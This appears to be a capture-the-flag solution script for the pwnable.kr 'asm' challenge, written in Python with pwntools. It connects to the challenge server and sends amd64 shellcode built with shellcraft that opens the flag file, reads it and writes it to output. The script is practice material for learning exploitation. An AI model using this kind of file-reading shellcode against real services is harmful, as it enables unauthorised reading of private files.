from pwn import *

#conn = ssh(host = 'pwnable.kr', user = 'asm', password = 'guest', port = '2222').connect_remote('localhost', 9026)
#conn.process(./asm)
conn = remote('pwnable.kr', 9026)
context(arch='amd64', os='linux')
filename='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\0'

shellcode = ''
shellcode += shellcraft.open(filename)
shellcode += shellcraft.read('rax', 'rsp', 100)     #read 100 bytes to buf which is [rsp]
shellcode += shellcraft.write(1, 'rsp', 100)        #output buf

#shellcode_hex =  asm(shellcode).encode('hex')

conn.recvuntil('shellcode: ')
conn.send(asm(shellcode))
#conn.send(shellcode_hex.decode('hex'))

log.success(conn.recvline())
#print conn.recv(1024)